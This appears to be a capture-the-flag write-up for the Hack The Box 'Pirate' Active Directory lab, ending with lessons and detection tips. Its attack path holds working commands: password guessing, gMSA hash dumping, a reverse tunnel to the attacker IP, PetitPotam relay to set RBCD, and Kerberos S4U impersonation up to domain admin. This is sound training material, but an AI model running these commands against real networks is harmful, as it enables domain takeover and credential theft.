---
layout: default
title: "Pirate"
parent: Hard Machines
grand_parent: Machines
permalink: /machines/hard/pirate/
---

# Pirate

![Machine Badge](https://img.shields.io/badge/Machine-Pirate-blue)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-orange)
![Season](https://img.shields.io/badge/Season-10%20Week%205-purple)

| Property | Value |
|----------|-------|
| **OS** | Windows Server 2019 |
| **Difficulty** | Hard |
| **Release** | 2026-02-28 (Season 10, Week 5) |
| **Tags** | #active-directory #pre2k #gmsa #ligolo #petitpotam #rbcd #s4u2proxy #spn-jacking #ntlm-relay |

---

## Summary

Pirate is a multi-host Active Directory attack across two network segments. Initial access exploits **Pre-Windows 2000 compatible computer accounts**, where the password equals the lowercase machine name truncated to 14 characters. From a Pre2k computer account, the attacker reads a **gMSA** managed-password and pivots into a second segment via **Ligolo-ng**. Inside, **PetitPotam** coerces WEB01 to authenticate, which is **relayed to LDAPS** to write **RBCD** (msDS-AllowedToActOnBehalfOfOtherIdentity) granting MS01$ delegation rights over WEB01$. The chain finishes with **WriteSPN + S4U2Proxy + altservice**, impersonating Administrator on any service - including DC01 - for Domain Admin.

---

## External Writeups

- [HTB-Andres (Beehiiv)](https://htb-writeup.beehiiv.com/p/pirate-machine-hackthebox)
- [4nuxd - Multi-Host AD Chain](https://4nuxd.one/writeups/pirate-hackthebox-walkthrough)
- [Medium - T0NY_8 (Pre2k / gMSA / RBCD / WriteSPN)](https://medium.com/@zakariaelamraoui12/hackthebox-pirate-pre2k-gmsa-rbcd-writespn-and-the-road-to-domain-admin-19ec4afe2d80)
- [GitHub: Zakaria - Pirate AD Lab Writeup](https://github.com/Zakariaelamraoui/pirate-AD_LAB_writeup/blob/main/HTB_Pirate_Writeup%20(2).md)
- [unimtx85 - HTB Pirate Writeup](https://unimtx85.github.io/HTB_machines_writeups/HTB_Pirate_Writeup.html)
- [The Pentesting Ninja (Protected)](https://blog.thepentesting.ninja/protected/htb-pirate/)
- [CyberSecGuru: Mastering Pirate](https://thecybersecguru.com/ctf-walkthroughs/mastering-pirate-beginners-guide-from-hackthebox/)
- [1337 Sheets - Pirate Hard (Feb 28, 2026)](https://1337sheets.com/hack-the-box-season-ten-htb-pirate-writeup-hard-weekly-feb/)

---

## Key Techniques

- **Pre-Windows 2000 machine accounts** with predictable passwords (`<lowercase-name>` truncated 14 chars)
- "Pre-Windows 2000 Compatible Access" group grants null-session-like read on legacy objects
- **gMSA** (Group Managed Service Account) password read via `KDS root key` + msDS-ManagedPassword DACL
- **Ligolo-ng** TCP-IP tunneling for dual-NIC pivot
- **PetitPotam** (MS-EFSRPC) authentication coercion
- **NTLM Relay to LDAPS** (`ntlmrelayx --delegate-access`) to write RBCD
- **RBCD (Resource-Based Constrained Delegation)** via `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **WriteSPN + altservice + S4U2Proxy** for "SPN jacking" lateral
- `Rubeus s4u /altservice:` for arbitrary SPN impersonation

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC pirate.htb
# 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389  (DC1)
```

### 2. Pre-Windows 2000 Accounts

Enumerate legacy machine accounts (account name ending `$`, `userAccountControl = 4128`):

```bash
impacket-GetADUsers -all -dc-ip pirate.htb pirate.htb/
nxc smb pirate.htb -u 'guest' -p '' --rid-brute 5000
# discover legacy hosts: LEGACY01$, MS01$
```

Pre-Windows 2000 password formula: **lowercase machine name (truncated to 14 chars)**:

```bash
impacket-getTGT pirate.htb/ms01\$:'ms01' -dc-ip pirate.htb
export KRB5CCNAME=ms01\$.ccache
```

### 3. Read gMSA Password

```bash
# As ms01$, dump gMSA via Pre-Windows 2000 group ACL
nxc ldap pirate.htb -k --use-kcache --gmsa
# or
python3 gMSADumper.py -u 'ms01$' -p '' -d pirate.htb
# Recover NT hash for gmsa$
```

### 4. Pivot via Ligolo-ng

```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On compromised host (drop via WinRM)
./agent.exe -connect 10.10.14.5:11601 -ignore-cert

# Add route to internal /24
sudo ip route add 172.16.7.0/24 dev ligolo
```

### 5. PetitPotam Coerce + NTLM Relay to LDAPS

```bash
# Listen for relayed creds, target LDAPS, write RBCD
impacket-ntlmrelayx -t ldaps://dc01.pirate.htb \
  --delegate-access --escalate-user 'MS01$' --no-smb-server -smb2support

# Coerce WEB01 to auth back to relay listener
python3 PetitPotam.py 10.10.14.5 web01.pirate.htb -u 'gmsa$' -hashes :<NT>
```

Relay output: `msDS-AllowedToActOnBehalfOfOtherIdentity` set to MS01$ on WEB01$.

### 6. S4U2Self + S4U2Proxy

```bash
# Get MS01$ TGT, then S4U
impacket-getST -spn 'cifs/web01.pirate.htb' -impersonate Administrator \
  -dc-ip dc01.pirate.htb 'pirate.htb/MS01$' -hashes :<NT>

export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
impacket-psexec -k -no-pass web01.pirate.htb
```

### 7. WriteSPN + S4U Altservice (SPN Jacking) to DC

On WEB01, an ACL grants WriteSPN over a DC service account. Add an arbitrary SPN and use `S4U2Proxy --altservice` to obtain a TGS for **any** service on DC01:

```powershell
Set-DomainObject -Identity 'svc-dc' -Set @{serviceprincipalname='HTTP/dc01.pirate.htb'}
Rubeus.exe s4u /user:svc-dc /rc4:<hash> /impersonateuser:Administrator \
           /msdsspn:HTTP/dc01.pirate.htb /altservice:cifs /ptt
dir \\dc01.pirate.htb\C$
```

Domain Admin / DA-equivalent access secured.

---

## Lessons Learned

- **Pre-Windows 2000 compatibility** is a 25-year-old setting still enabled in modern domains. Its password formula is one of the cheapest initial-access paths in AD.
- **gMSA** is only as safe as the KDS root key and the **PrincipalsAllowedToRetrieveManagedPassword** DACL.
- **PetitPotam + ntlmrelayx --delegate-access** remains the AD-relay one-two punch in 2026.
- **RBCD vs. unconstrained delegation**: RBCD is harder to detect because it's set as an attribute on the **target**, not the impersonator.
- **WriteSPN + altservice** is the modern "Kerberos golden hammer" - any ACL that allows `serviceprincipalname` write is functionally domain-admin if combined with S4U2Proxy.

---

## Detection

- LDAP modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Pre-Windows 2000 account password set events (4724) on legacy `*$` objects.
- Multiple LDAPS bind failures followed by a successful bind from a low-priv account = relay in progress.
- `Rubeus.exe`, `Impacket-Toolkit`, `PetitPotam.py` execution / on-disk presence.
